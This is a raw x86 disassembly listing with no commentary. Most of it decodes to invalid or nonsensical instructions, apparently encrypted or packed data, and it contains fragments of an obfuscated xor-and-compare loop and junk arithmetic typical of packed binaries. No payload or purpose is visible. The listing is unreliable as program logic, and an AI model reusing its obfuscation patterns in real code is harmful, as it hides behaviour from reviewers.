  408bdb:	cmp    DWORD PTR [ecx+0x4f4a4802],esi
  408be1:	jo     0x408bd5
  408be3:	mov    esp,0xe7e7c409
  408be8:	call   0x2f01:0x444c5db6
  408bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bf0:	cmp    al,0x5c
  408bf2:	sbb    eax,0x1b69dc7
  408bf7:	lea    ebp,[eax-0x20]
  408bfa:	mov    ebp,eax
  408bfc:	jge    0x408bb4
  408bfe:	pushf  
  408bff:	addr16 mov ds:0x65c6,eax
  408c03:	pop    ecx
  408c04:	test   BYTE PTR [ecx+0x31176a5a],ch
  408c0a:	ret    
  408c0b:	mov    dl,0xc7
  408c0d:	and    BYTE PTR [ebp-0x4d7477af],0xfe
  408c14:	mov    bh,bl
  408c16:	test   eax,0x6eb61f5f
  408c1b:	xor    dl,BYTE PTR [edx-0x16]
  408c1e:	jo     0x408bf2
  408c20:	gs in  eax,dx
  408c22:	mov    cl,bl
  408c24:	cli    
  408c25:	stos   BYTE PTR es:[edi],al
  408c26:	pop    ebp
  408c27:	inc    ebp
  408c28:	dec    esp
  408c29:	ret    0xa884
  408c2c:	pop    ecx
  408c2d:	mov    dh,0x56
  408c2f:	add    BYTE PTR [ebp-0x7c],dh
  408c32:	cli    
  408c33:	pop    edi
  408c34:	bound  edi,QWORD PTR [esp+edx*1+0x381dd55]
  408c3b:	inc    esp
  408c3c:	call   0xfe3b1bdd
  408c41:	dec    edx
  408c42:	sbb    bh,BYTE PTR [ebx-0x58]
  408c45:	adc    DWORD PTR [ecx],esp
  408c47:	and    DWORD PTR [ecx],ebx
  408c49:	mov    ds:0xb2268540,eax
  408c4e:	sbb    DWORD PTR [eax+0x3c844ca0],edi
  408c54:	adc    DWORD PTR [ebp+0x5b967cb2],0x90273a12
  408c5e:	(bad)  
  408c5f:	push   ebp
  408c60:	inc    ebp
  408c61:	retf   
  408c62:	test   BYTE PTR [esi-0xedaf9a2],0xb0
  408c69:	ror    BYTE PTR [eax-0x6edf69f7],1
  408c6f:	ret    
  408c70:	in     eax,dx
  408c71:	mov    esp,0xb6abea84
  408c76:	push   cs
  408c77:	inc    edi
  408c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c79:	out    0xe4,eax
  408c7b:	pop    es
  408c7c:	xor    BYTE PTR [ebx],al
  408c7e:	sbb    eax,0xb9480a2c
  408c83:	fisttp QWORD PTR [ebx+0x18]
  408c86:	mov    dh,0x80
  408c88:	add    BYTE PTR [ebx-0x4edaa5b2],bh
  408c8e:	lods   eax,DWORD PTR ds:[esi]
  408c8f:	mov    dh,0x5b
  408c91:	xor    edx,DWORD PTR [eax]
  408c93:	adc    esi,0x5e
  408c96:	dec    esi
  408c97:	adc    edi,ebp
  408c99:	add    ch,BYTE PTR ss:[edi]
  408c9c:	xor    DWORD PTR [esp+ebp*8+0x20],esi
  408ca0:	(bad)  
  408ca1:	je     0x408c94
  408ca3:	sbb    ebx,esi
  408ca5:	ja     0x408c37
  408ca7:	pushf  
  408ca8:	and    BYTE PTR [ecx],bh
  408caa:	dec    ecx
  408cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cac:	or     eax,0x4b05c67e
  408cb1:	cmp    DWORD PTR [ebp-0x4b8ac2c8],0xffffff99
  408cb8:	xchg   edi,eax
  408cb9:	xlat   BYTE PTR ds:[ebx]
  408cba:	push   cs
  408cbb:	pop    edi
  408cbc:	icebp  
  408cbd:	dec    esp
  408cbe:	imul   ecx,DWORD PTR [eax+eiz*4],0xbf26e89f
  408cc5:	mov    ch,0xd3
  408cc7:	or     al,BYTE PTR [esi]
  408cc9:	push   0x1aac76f9
  408cce:	add    al,BYTE PTR [edi-0x71e9fab1]
  408cd4:	fst    DWORD PTR [edx+0x3618df1f]
  408cda:	test   al,0xd6
  408cdc:	fdiv   QWORD PTR [esi]
  408cde:	sbb    al,0x4a
  408ce0:	pop    ecx
  408ce1:	xor    al,0x6b
  408ce3:	fcomp  st(1)
  408ce5:	sub    BYTE PTR [edi],cl
  408ce7:	mov    bh,0x4
  408ce9:	nop
  408cea:	xor    eax,0x8a43
  408cef:	add    eax,edi
  408cf1:	mov    edi,DWORD PTR [ebp-0x14]
  408cf4:	mov    BYTE PTR [ebp+edi*1-0x58],al
  408cf8:	mov    eax,DWORD PTR [ebp-0xc]
  408cfb:	inc    edx
  408cfc:	cmp    edx,eax
  408cfe:	jne    0x408b9f
  408d04:	pop    edi
  408d05:	pop    ebx
  408d06:	mov    eax,DWORD PTR [ebp-0x8]
  408d09:	mov    edx,DWORD PTR [ebp+0x10]
  408d0c:	xor    eax,ecx
  408d0e:	jmp    0x408e37
  408d13:	inc    esp
  408d14:	(bad)  
  408d15:	jno    0x408cee
  408d17:	icebp  
  408d18:	stc    
  408d19:	js     0x408d80
  408d1b:	xchg   esp,eax
  408d1c:	ins    BYTE PTR es:[edi],dx
  408d1d:	retf   0xbca3
  408d20:	out    dx,eax
  408d21:	push   0x4c
  408d23:	cmp    DWORD PTR [edi],ebp
  408d25:	jle    0x408da5
  408d27:	or     bh,BYTE PTR [edi+0x7e]
  408d2a:	jle    0x408cfd
  408d2c:	cld    
  408d2d:	jge    0x408d7a
  408d2f:	mov    cl,0x51
  408d31:	push   edi
  408d32:	push   ds
  408d33:	imul   edx,DWORD PTR [edi-0x44],0x64bfa849
  408d3a:	aad    0xa3
  408d3c:	aam    0x64
  408d3e:	mov    bh,0xf9
  408d40:	aam    0x9a
  408d42:	sbb    esi,edi
  408d44:	fld    TBYTE PTR [esi-0x68]
  408d47:	mov    esi,0x2102e4b5
  408d4c:	xchg   ebx,eax
  408d4d:	aaa    
  408d4e:	stos   DWORD PTR es:[edi],eax
  408d4f:	add    dh,ah
  408d51:	fsub   QWORD PTR [edx+0x75]
  408d54:	push   ecx
  408d55:	mov    edx,0x47aed8d1
  408d5a:	inc    edx
  408d5b:	loope  0x408dc4
  408d5d:	nop
  408d5e:	add    al,0x8f
  408d60:	mov    BYTE PTR [eax],ah
  408d62:	pop    ebx
  408d63:	pop    esp
  408d64:	add    bl,BYTE PTR [edx+0x54]
  408d67:	fstp   DWORD PTR [edx]
  408d69:	pop    es
  408d6a:	xor    esi,DWORD PTR [edx-0x700c25ad]
  408d70:	cwde   
  408d71:	call   0x2a0c37c4
  408d76:	shl    BYTE PTR [esi-0x6a],1
  408d79:	or     esi,edx
  408d7b:	sub    BYTE PTR cs:[ebx+eiz*1-0x3e9d5bfb],dl
  408d83:	mov    bl,0x5b
  408d85:	outs   dx,BYTE PTR ds:[esi]
  408d86:	pop    eax
  408d87:	sbb    BYTE PTR [ebp-0x56],cl
  408d8a:	jmp    0x408dfd
  408d8c:	lahf   
  408d8d:	push   es
  408d8e:	(bad)  
  408d8f:	loope  0x408d74
  408d91:	mov    edx,0x70654d72
  408d96:	loopne 0x408db9
  408d98:	or     BYTE PTR [ebx+edx*1],cl
  408d9b:	int3   
  408d9c:	sub    DWORD PTR [edx+eiz*1],ebx
  408d9f:	jbe    0x408da1
  408da1:	mov    ds:0x1bb04df5,eax
  408da6:	pop    edx
  408da7:	xlat   BYTE PTR ds:[ebx]
  408da8:	mov    ecx,0xfb713366
  408dad:	pop    ebx
  408dae:	outs   dx,BYTE PTR ds:[esi]
  408daf:	retf   0xa7c
  408db2:	clc    
  408db3:	cmp    al,0xff
  408db5:	in     al,0x1f
  408db7:	mov    esi,DWORD PTR [edx+esi*8-0x6626e946]
  408dbe:	cmp    cl,dh
  408dc0:	iret   
  408dc1:	push   ebx
  408dc2:	fwait
  408dc3:	mov    cl,0xf1
  408dc5:	das    
  408dc6:	das    
  408dc7:	aaa    
  408dc8:	cmp    ch,ah
  408dca:	popf   
  408dcb:	and    al,0xc9
  408dcd:	dec    edi
  408dce:	mov    ecx,0x706d0ac7
  408dd3:	jp     0x408e4b
  408dd5:	push   0xffffffe2
  408dd7:	sbb    DWORD PTR [edx],edx
  408dd9:	mov    ds:0x5ee8cff2,al
  408dde:	push   edi
  408ddf:	jge    0x408e0c
  408de1:	xchg   ebp,eax
  408de2:	(bad)  
  408de3:	adc    dl,bl
  408de5:	adc    bh,0x3c
  408de8:	jns    0x408d6d
  408dea:	fmul   DWORD PTR [ecx-0x4dd7c8e8]
  408df0:	arpl   WORD PTR [ebx-0x2],sp
  408df3:	mov    ds:0xe88ddcc4,al
  408df8:	rol    BYTE PTR [ebx+0x46254de3],0x78
  408dff:	mov    cs,WORD PTR [ebx]
  408e01:	ret    0x8c33
  408e04:	gs nop
  408e06:	mov    edi,0x573cf792
  408e0b:	mov    al,0xe2
  408e0d:	fisttp DWORD PTR [edi+0x61]
  408e10:	(bad)  
  408e11:	fcmovbe st,st(3)
  408e13:	push   es
  408e14:	cmp    eax,0x76d570fd
  408e19:	neg    ch
  408e1b:	fs out dx,eax
  408e1d:	cmp    DWORD PTR [eax],ebp
  408e1f:	or     esp,DWORD PTR ds:0x249f92a1
  408e25:	inc    esi
  408e26:	(bad)  
  408e27:	or     eax,0xaaff0e6d
  408e2c:	gs and esp,esi
  408e2f:	inc    ebx
  408e30:	xchg   edi,eax
  408e31:	inc    esp
  408e32:	sahf   
  408e33:	fsub   DWORD PTR [edi]
  408e35:	popf   
  408e36:	call   0x24e9:0x289c603
  408e3d:	add    DWORD PTR [eax],eax
  408e3f:	add    BYTE PTR [eax+0x2b],cl
  408e42:	or     dh,al
  408e44:	imul   edx,DWORD PTR [ecx+0x1c4aeb48],0xc536de2b
  408e4e:	pop    esp
  408e4f:	daa    
  408e50:	xor    eax,0xa7e7e2c
  408e55:	jg     0x408ed5
  408e57:	jle    0x408ed5
  408e59:	add    al,0xd0
  408e5b:	lock pusha 
  408e5d:	sub    edi,eax
  408e5f:	or     DWORD PTR [ebx],ebp
  408e61:	in     eax,dx
  408e62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e63:	shr    esp,cl
  408e65:	hlt    
  408e66:	sbb    BYTE PTR [eax+0x7a],bl
  408e69:	ret    
  408e6a:	sub    edx,DWORD PTR [ebp-0x2f]
  408e6d:	test   bl,al
  408e6f:	mov    ecx,0x5da85109
  408e74:	test   DWORD PTR [ecx],ebp
  408e76:	fs ss retf 
  408e79:	mov    cl,0x5c
  408e7b:	xor    ebp,DWORD PTR ds:0xc71ef7a9
  408e81:	mov    dl,0x97
  408e83:	leave  
  408e84:	in     eax,dx
  408e85:	adc    BYTE PTR [ebx-0xc8e8023],bh
  408e8b:	iret   
  408e8c:	adc    al,0x89
  408e8e:	push   ebx
  408e8f:	gs xor esi,ebx
  408e92:	xchg   esi,eax
  408e93:	call   0x38c4771a
  408e98:	mov    ah,0x7d
  408e9a:	aad    0xf5
  408e9c:	sub    esp,DWORD PTR [ebp+edi*2-0x13]
  408ea0:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  408ea2:	xchg   edx,eax
  408ea3:	adc    DWORD PTR [edi+0x3f],esp
  408ea6:	sub    al,0x74
  408ea8:	call   0x21a1:0x3f90a23c
  408eaf:	ss arpl si,sp
  408eb2:	fcmove st,st(4)
  408eb4:	mov    ebx,0xb5bf92bf
  408eb9:	xor    ecx,DWORD PTR [ecx-0x30]
  408ebc:	stc    
  408ebd:	push   ebx
  408ebe:	adc    esi,DWORD PTR [esi]
  408ec0:	and    eax,0xb198423e
  408ec5:	mov    eax,ds:0x40efe3d2
  408eca:	and    eax,0x20c72378
  408ecf:	fiadd  DWORD PTR [esi+edi*8-0x2bf48798]
  408ed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ed7:	mov    ebx,0x88fd0103
  408edc:	popf   
  408edd:	jmp    0x98c1:0xd191e568
  408ee4:	mov    BYTE PTR [edx],0x70
  408ee7:	cmp    BYTE PTR [eax+0x79],0x2d
  408eeb:	xchg   ebx,eax
  408eec:	mov    eax,0xfc8fadf9
  408ef1:	ins    BYTE PTR es:[edi],dx
  408ef2:	loopne 0x408f3b
  408ef4:	clc    
  408ef5:	adc    DWORD PTR [eax],0xee11bc95
  408efb:	call   0x895e:0x9255a6b
  408f02:	xchg   DWORD PTR [esi+0x4038af19],eax
  408f08:	pop    ds
  408f09:	ret    0xdc09
  408f0c:	retf   
  408f0d:	mov    cl,0x61
  408f0f:	mov    eax,0x4e770c7
  408f14:	scas   al,BYTE PTR es:[edi]
  408f15:	jmp    0xae44a7a6
  408f1a:	sbb    al,al
  408f1c:	dec    edx
  408f1d:	inc    esi
  408f1e:	xchg   esp,ecx
  408f20:	mov    BYTE PTR [ebx],0x72
  408f23:	call   0xeda2:0xf8fd321
  408f2a:	or     al,0x2c
  408f2c:	cmp    dl,bh
  408f2e:	sub    esp,eax
  408f30:	mov    bl,0x66
  408f32:	adc    DWORD PTR [eax-0x38],esi
  408f35:	rol    DWORD PTR [edi-0xfe180fb],1
  408f3b:	sbb    DWORD PTR [ecx-0xc],ebx
  408f3e:	xor    ah,BYTE PTR [esi-0x4]
  408f41:	xchg   esi,eax
  408f42:	push   ds
  408f43:	test   eax,0x4ec4b90b
  408f48:	mov    edi,0xb92f135f
  408f4d:	repnz mov eax,ds:0x2913dcf7
  408f53:	ret    0xce1a
  408f56:	xchg   edx,eax
  408f57:	inc    ebp
  408f58:	or     DWORD PTR [eax],ebx
  408f5a:	call   0xf09ea681
  408f5f:	push   esp
  408f60:	ret    
  408f61:	(bad)  [ebx]
  408f63:	pop    esp
  408f64:	mov    eax,DWORD PTR [ebp-0x8]
  408f67:	xor    eax,ecx
  408f69:	add    eax,esi
  408f6b:	mov    DWORD PTR [ebp+0x8],eax
  408f6e:	mov    eax,DWORD PTR [ebp+0x8]
  408f71:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f75:	mov    dl,BYTE PTR [ebp-0x1]
  408f78:	cmp    al,dl
  408f7a:	je     0x4090e6
  408f80:	mov    eax,DWORD PTR [ebp+0x8]
  408f83:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f87:	mov    edx,DWORD PTR [ebp+0xc]
  408f8a:	cmp    al,BYTE PTR [edx]
  408f8c:	jne    0x40935e
  408f92:	mov    eax,DWORD PTR [ebp-0x8]
  408f95:	mov    edx,DWORD PTR [ebp+0xc]
  408f98:	jmp    0x4090c1
  408f9d:	jmp    0x7952d498
  408fa2:	loopne 0x40901d
  408fa4:	mov    ch,0xbe
  408fa6:	jmp    0xff1cb935
  408fab:	daa    
  408fac:	imul   eax,ecx,0x2d
  408faf:	jle    0x40902f
  408fb1:	or     bh,BYTE PTR [edi+0x7e]
  408fb4:	jle    0x408fe0
  408fb6:	inc    ebp
  408fb7:	push   ecx
  408fb8:	in     al,dx
  408fb9:	mov    bl,0xa5
  408fbb:	xor    ecx,DWORD PTR ds:0x3dad91c3
  408fc1:	cmp    dl,al
  408fc3:	jecxz  0x408f97
  408fc5:	cmp    DWORD PTR [esi-0x43709c54],0x2
  408fcc:	je     0x409026
  408fce:	xchg   edx,eax
  408fcf:	fisubr DWORD PTR [edi-0x3b8e878]
  408fd5:	(bad)  
  408fd7:	das    
  408fd8:	test   DWORD PTR [ecx-0x5db509c8],eax
  408fde:	pop    ds
  408fdf:	xlat   BYTE PTR ds:[ebx]
  408fe0:	ror    DWORD PTR [ecx+0x23bc666f],1
  408fe6:	inc    ebx
  408fe7:	jecxz  0x40902c
  408fe9:	sbb    edx,DWORD PTR [eax+0x7f]
  408fec:	repnz fidiv WORD PTR [ebx+0x5e]
  408ff0:	cmp    esp,DWORD PTR [ebp-0xe16fccf]
  408ff6:	mov    edi,0x338f646e
  408ffb:	inc    eax
  408ffc:	jbe    0x408fba
  408ffe:	(bad)  
  408fff:	loope  0x408fe5
  409001:	out    dx,eax
  409002:	add    esi,0x59
  409005:	push   es
  409006:	das    
  409007:	(bad)  
  409008:	les    eax,FWORD PTR [eax+0x5a]
  40900b:	xchg   edi,eax
  40900c:	scas   al,BYTE PTR es:[edi]
  40900d:	push   ebp
  40900e:	rol    cl,1
  409010:	mov    cl,0x9
  409012:	mov    ebx,0x1d8df79c
  409017:	aas    
  409018:	das    
  409019:	pop    eax
  40901a:	inc    edi
  40901b:	xchg   edi,eax
  40901c:	sub    al,0x1
  40901e:	cdq    
  40901f:	int3   
  409020:	dec    eax
  409021:	add    BYTE PTR [ebx+0x59],0x4d
  409025:	out    dx,eax
  409026:	mov    ebx,edi
  409028:	inc    edi
  409029:	inc    ebx
  40902a:	jle    0x4090a4
  40902c:	arpl   WORD PTR [edx],bp
  40902e:	rol    ah,0x3
  409031:	sbb    al,0xca
  409033:	mov    eax,ds:0xc39890cd
  409038:	jbe    0x409088
  40903a:	or     al,0x7
  40903c:	(bad)  
  40903d:	sub    BYTE PTR ds:0xc2b00e2b,dl
  409043:	data16 ficomp WORD PTR [eax-0x61]
  409047:	bound  ecx,QWORD PTR [ebx-0x2378f22a]
  40904d:	adc    ecx,DWORD PTR [eax]
  40904f:	adc    BYTE PTR [ebx],cl
  409051:	mov    ebp,0xee25d50c
  409056:	retf   0x5389
  409059:	int    0x8b
  40905b:	data16 and BYTE PTR [esi-0x4827ac3c],0x72
  409063:	imul   ebx,DWORD PTR [esi+0x51f1d03b],0x4d5f4ee6
  40906d:	fild   WORD PTR [eax+esi*1+0x3a3bfc50]
  409074:	int    0xf9
  409076:	ja     0x40905f
  409078:	mov    ecx,?
  40907a:	mov    cl,BYTE PTR [esi+0x66f9809b]
  409080:	push   edx
  409081:	and    al,al
  409083:	sub    edx,DWORD PTR [ebx]
  409085:	pushf  
  409086:	pop    esp
  409087:	les    ebp,FWORD PTR [edx]
  409089:	daa    
  40908a:	add    al,0x73
  40908c:	(bad)  
  40908d:	cmc    
  40908e:	icebp  
  40908f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409090:	and    dh,BYTE PTR [esi-0x57]
  409093:	cdq    
  409094:	and    al,bl
  409096:	out    0x16,al
  409098:	sub    al,0xae
  40909a:	dec    edx
  40909b:	div    BYTE PTR ds:0xc72365fd
  4090a1:	add    al,0xd2
  4090a3:	in     eax,0x52
  4090a5:	mov    ebp,0xf83c23f0
  4090aa:	pop    ds
  4090ab:	jl     0x40910c
  4090ad:	jnp    0x40904b
  4090af:	and    eax,0x8c788d0
  4090b4:	cmp    BYTE PTR [eax+0x36],bh
  4090b7:	xor    dl,bl
  4090b9:	jecxz  0x4090f6
  4090bb:	loopne 0x4090a4
  4090bd:	out    dx,eax
  4090be:	repnz fild QWORD PTR [ecx]
  4090c1:	movsx  edx,BYTE PTR [edx]
  4090c4:	xor    eax,ecx
  4090c6:	add    eax,esi
  4090c8:	cmp    edx,eax
  4090ca:	je     0x409229
  4090d0:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  4090d7:	lea    eax,[ebp-0x18]
  4090da:	mov    DWORD PTR [ebp-0x14],eax
  4090dd:	mov    eax,DWORD PTR [ebp-0x14]
  4090e0:	add    DWORD PTR [eax],0x705fa8e
  4090e6:	mov    eax,DWORD PTR [ebp-0x10]
  4090e9:	jmp    0x409212
  4090ee:	lods   eax,DWORD PTR ds:[esi]
  4090ef:	lock test BYTE PTR [ecx+edi*4],al
  4090f3:	sbb    BYTE PTR [ebp-0x47188557],ch
  4090f9:	daa    
  4090fa:	sub    eax,0xddf5b6f0
  4090ff:	and    bh,BYTE PTR [esi+0x7e]
  409102:	or     bh,BYTE PTR [edi+0x7e]
  409105:	jle    0x409144
  409107:	mov    dl,0x55
  409109:	mov    bl,0x2a
  40910b:	fcomi  st,st(6)
  40910d:	cmp    BYTE PTR [ebx+0x76],dl
  409110:	xchg   edi,eax
  409111:	jmp    DWORD PTR [ebp+0x65]
  409114:	add    dh,BYTE PTR [edx+0x58]
  409117:	push   eax
  409118:	sbb    edi,DWORD PTR [eax-0x674d5a75]
  40911e:	loopne 0x40912a
  409120:	sbb    dl,BYTE PTR [ecx]
  409122:	outs   dx,DWORD PTR ds:[esi]
  409123:	and    DWORD PTR [ebp-0x2120e76f],esi
  409129:	std    
  40912a:	pop    ebp
  40912b:	or     al,0x67
  40912d:	ja     0x409140
  40912f:	in     al,dx
  409130:	cli    
  409131:	push   ss
  409132:	sbb    dl,BYTE PTR [ebp+0x3de47bdb]
  409138:	int3   
  409139:	loop   0x40917c
  40913b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40913c:	xor    BYTE PTR [edx-0x75],al
  40913f:	jo     0x4090f2
  409141:	in     al,dx
  409142:	lods   eax,DWORD PTR ds:[esi]
  409143:	sbb    BYTE PTR [edx+0x6],ch
  409146:	mov    ds:0x5b963546,eax
  40914b:	push   cs
  40914c:	pop    eax
  40914d:	fbstp  TBYTE PTR [esi+0x3e]
  409150:	(bad)  
  409151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409152:	pop    es
  409153:	sub    ebp,DWORD PTR [edi-0x4f]
  409156:	(bad)  
  409157:	(bad)  
  409159:	push   esi
  40915a:	(bad)  
  40915b:	repz inc ebx
  40915d:	jmp    0x4090ee
  40915f:	fld    TBYTE PTR [ecx+0x7265a07c]
  409165:	or     DWORD PTR [ebp-0x2834111a],eax
  40916b:	mov    esi,0x5d420a3c
  409170:	retf   
  409171:	mov    DWORD PTR [eax],ecx
  409173:	ret    0x88f8
  409176:	test   DWORD PTR [ebp+0x7f],ecx
  409179:	shl    DWORD PTR [eax],0x65
  40917c:	loop   0x409121
  40917e:	(bad)  
  40917f:	aam    0x1d
  409181:	sbb    ah,dh
  409183:	imul   edx,DWORD PTR [edi],0xffffff81
  409186:	fiadd  DWORD PTR [ebx]
  409188:	adc    BYTE PTR [edi+edx*2+0x410c8484],bl
  40918f:	xchg   cl,ah
  409191:	push   esp
  409192:	test   eax,0x3abef89b
  409197:	scas   al,BYTE PTR es:[edi]
  409198:	sub    eax,0x7baeb18f
  40919d:	popa   
  40919e:	rcr    BYTE PTR [esi+0x40a2759d],cl
  4091a4:	xor    al,0x27
  4091a6:	retf   0x560e
  4091a9:	xchg   esi,eax
  4091aa:	inc    ebx
  4091ab:	push   ebp
  4091ac:	std    
  4091ad:	sbb    DWORD PTR [esi+0x3d7bf076],edx
  4091b3:	xchg   edx,eax
  4091b4:	dec    eax
  4091b5:	inc    edi
  4091b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091b7:	mov    esi,0xd598779b
  4091bc:	pusha  
  4091bd:	and    ah,BYTE PTR [ebx]
  4091bf:	ss clc 
  4091c1:	popa   
  4091c2:	inc    esp
  4091c3:	push   ebx
  4091c4:	aas    
  4091c5:	xlat   BYTE PTR ds:[ebx]
  4091c6:	pop    edi
  4091c7:	push   ecx
  4091c8:	es loop 0x409228
  4091cb:	jle    0x409153
  4091cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091ce:	sti    
  4091cf:	add    al,0x96
  4091d1:	inc    esp
  4091d2:	or     cl,ch
  4091d4:	pusha  
  4091d5:	xor    edx,DWORD PTR [ebx+0x59]
  4091d8:	cmp    cl,BYTE PTR ds:0x212f4b5
  4091de:	mov    al,ds:0x8f9288d
  4091e3:	dec    esi
  4091e4:	(bad)  
  4091e5:	cmp    BYTE PTR [eax],al
  4091e7:	jg     0x40917c
  4091e9:	mov    ah,0xa1
  4091eb:	sbb    DWORD PTR [ebx-0x1ff76c7a],eax
  4091f1:	adc    DWORD PTR [edx],ebp
  4091f3:	mov    ds,esi
  4091f5:	sbb    ah,al
  4091f7:	mov    ds:0xfc6ac027,al
  4091fc:	dec    edi
  4091fd:	in     al,dx
  4091fe:	mov    ah,0x31
  409200:	and    al,0x9a
  409202:	jmp    0x4091e1
  409204:	in     eax,0x0
  409206:	jle    0x409224
  409208:	sub    al,0xeb
  40920a:	adc    DWORD PTR [ebp-0x5e288941],0xffffffae
  409211:	loope  0x40919e
  409213:	push   ebp
  409214:	or     BYTE PTR [ebx],dh
  409216:	ror    DWORD PTR [ebp+0x729f1084],0x32
  40921d:	add    BYTE PTR [ecx+0x45ff0845],cl
  409223:	or     al,0xe9
  409225:	inc    ebp
  409226:	std    
  409227:	(bad)  
  409228:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  40922e:	jmp    0x409357
  409233:	or     DWORD PTR ds:0xd93acb2e,ebx
  409239:	stc    
  40923a:	(bad)  [ecx-0x29785839]
  409240:	ret    
  409241:	mov    eax,ds:0x7e23e962
  409246:	jle    0x409252
  409248:	jg     0x4092c8
  40924a:	jle    0x4092bb
  40924c:	lock sbb al,0x48
  40924f:	jge    0x40921f
  409251:	in     eax,dx
  409252:	push   ecx
  409253:	outs   dx,BYTE PTR fs:[esi]
  409255:	pop    ds
  409256:	sahf   
  409257:	out    0x6b,al
  409259:	out    0x89,al
  40925b:	icebp  
  40925c:	mov    es,ecx
  40925e:	adc    BYTE PTR [ebx+0x62],al
  409261:	loop   0x409262
  409263:	mov    ch,0x8c
  409265:	push   ebx
  409266:	cmc    
  409267:	cmp    DWORD PTR [esi],eax
  409269:	into   
  40926a:	add    bh,ch
  40926c:	ror    BYTE PTR [eax+0x3e],1
  40926f:	push   es
  409270:	test   al,0xb8
  409272:	ins    BYTE PTR es:[edi],dx
  409273:	jns    0x40925a
  409275:	mov    al,ds:0x4851735b
  40927a:	add    cl,al
  40927c:	jns    0x40926c
  40927e:	push   edx
  40927f:	jnp    0x409275
  409281:	or     al,0x26
  409283:	dec    edx
  409284:	or     esp,DWORD PTR [eax+0x7]
  409287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409288:	cmp    ah,0x4d
  40928b:	push   edx
  40928c:	inc    ecx
  40928d:	mov    ds:0xab7aa1ec,eax
  409292:	scas   al,BYTE PTR es:[edi]
  409293:	and    eax,0x2236685a
  409298:	retf   0x6ff2
  40929b:	(bad)  
  40929c:	cld    
  40929d:	xor    eax,DWORD PTR [ecx]
  40929f:	scas   eax,DWORD PTR es:[edi]
  4092a0:	sbb    bh,BYTE PTR [ebp+eax*1-0xef1e80b]
  4092a7:	(bad)  
  4092a8:	ror    BYTE PTR ds:0x48716429,cl
  4092ae:	inc    BYTE PTR [ebp+0x5d]
  4092b1:	adc    eax,0xc5ab69f4
  4092b6:	mov    al,ds:0xc461b1b
  4092bb:	mov    ds:0xd56e8cd4,eax
  4092c0:	icebp  
  4092c1:	popa   
  4092c2:	cmc    
  4092c3:	arpl   WORD PTR [ebp+0x5d17e926],ax
  4092c9:	jl     0x409259
  4092cb:	mov    eax,0x6ee7ef6b
  4092d0:	call   0x3bf73874
  4092d5:	and    BYTE PTR [edi-0x16f04a7e],0x94
  4092dc:	cmp    al,0x36
  4092de:	ror    DWORD PTR [edi+ebx*4+0x305b296b],0x6c
  4092e6:	mov    ebp,0x67662904
  4092eb:	xor    dl,dl
  4092ed:	aaa    
  4092ee:	jns    0x4092e0
  4092f0:	push   es
  4092f1:	xor    eax,0x5242cb19
  4092f6:	loope  0x40933d
  4092f8:	(bad)  
  4092f9:	pop    ebp
  4092fa:	push   ebp
  4092fb:	adc    dl,BYTE PTR [ebx]
  4092fd:	loopne 0x409360
  4092ff:	jbe    0x409343
  409301:	imul   eax,DWORD PTR [ebx+0x1d],0xffffff96
  409305:	cld    
  409306:	dec    edx
  409307:	addr16 jle 0x409330
  40930a:	(bad)
  40930d:	test   eax,0xd1f2ccce
  409312:	add    bl,BYTE PTR [ebp-0x36952c0a]
  409318:	(bad)  
  409319:	inc    esi
  40931a:	mov    ebx,0x391d87a4
  40931f:	or     ecx,DWORD PTR [eax]
  409321:	into   
  409322:	iret   
  409323:	inc    edi
  409324:	sbb    dl,al
  409326:	int    0xcd
  409328:	lahf   
  409329:	pop    ecx
  40932a:	gs inc esp
  40932c:	push   edi
  40932d:	sbb    ebp,0x3fab2e1f
  409333:	sbb    eax,0xfc4ffb9
  409338:	repz and edx,DWORD PTR [edi-0xb]
  40933c:	adc    DWORD PTR [edx-0x73],0xd2be3b0
  409343:	or     eax,DWORD PTR [ecx-0x11e2a6df]
  409349:	ret    
  40934a:	add    DWORD PTR [edi-0x46],ebx
  40934d:	cs sub al,0xf9
  409350:	or     dl,ah
  409352:	jle    0x409348
  409354:	mov    ecx,0x4d8b3bc5
  409359:	adc    BYTE PTR [ebx],al
  40935b:	(bad)  
  40935c:	mov    DWORD PTR [ecx],eax
  40935e:	pop    esi
  40935f:	leave  
  409360:	ret    0xc
  409363:	push   ebp
  409364:	mov    ebp,esp
  409366:	push   ecx
  409367:	not    eax
  409369:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409370:	mov    eax,DWORD PTR [ebp-0x4]
  409373:	mov    edx,DWORD PTR [ebp+0x10]
  409376:	add    DWORD PTR ds:0x4245c6,ebx
  40937c:	mov    ecx,0x7510859
  409381:	adc    DWORD PTR ds:0x41235c,0x4245c6
  40938b:	xor    eax,ecx
  40938d:	add    eax,0x32729f
  409392:	and    DWORD PTR ds:0x412368,0x417e41
  40939c:	mov    DWORD PTR [edx],eax
  40939e:	mov    eax,DWORD PTR [ebp+0xc]
  4093a1:	and    DWORD PTR ds:0x4245be,0x0
  4093ab:	jmp    0x4093bd
  4093b0:	mov    edx,DWORD PTR ds:0x4245be
  4093b6:	inc    edx
  4093b7:	mov    DWORD PTR ds:0x4245be,edx
  4093bd:	cmp    DWORD PTR ds:0x4245be,0x14
  4093c4:	jae    0x4093eb
  4093ca:	cmp    DWORD PTR ds:0x4245be,0x1c
  4093d1:	jne    0x4093e0
  4093d7:	push   DWORD PTR [ebp-0x20]
  4093da:	call   DWORD PTR ds:0x40d1e8
  4093e0:	jmp    0x4093b0
  4093e5:	sub    DWORD PTR ds:0x41237c,ebx
  4093eb:	xor    eax,ecx
  4093ed:	adc    edx,DWORD PTR ds:0x412360
  4093f3:	push   esi
  4093f4:	add    esi,edx
